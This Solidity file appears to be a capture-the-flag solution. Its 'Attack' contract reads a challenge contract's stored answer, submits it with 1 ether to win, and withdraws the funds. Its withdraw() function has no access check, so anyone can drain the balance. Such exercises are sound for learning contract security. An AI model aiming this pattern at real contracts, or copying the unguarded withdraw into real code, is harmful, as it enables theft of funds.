// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Interface for the GuessTheRandomNumberChallenge contract
interface IGuessTheRandomNumberChallenge {
    function answer() external view returns (uint8);

    function guess(uint8 n) external payable;
}

// Takes the address of the GuessTheRandomNumberChallenge contract as an input to its constructor.
// It uses an interface to read the answer from the target contract and call the guess function with the correct answer.
// The attacker can withdraw any balance from the contract after a successful attack by calling the withdraw function.
contract Attack {
    IGuessTheRandomNumberChallenge public guessTheRandomNumberChallenge;

    constructor(address _guessTheRandomNumberChallengeAddress) {
        guessTheRandomNumberChallenge = IGuessTheRandomNumberChallenge(
            _guessTheRandomNumberChallengeAddress
        );
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Send 1 ether to perform the attack");

        // Read the answer from the GuessTheRandomNumberChallenge contract
        uint8 answer = guessTheRandomNumberChallenge.answer();

        // Call the guess function with the correct answer
        guessTheRandomNumberChallenge.guess{value: 1 ether}(answer);
    }

    // Withdraw the balance from the Attack contract after a successful attack
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
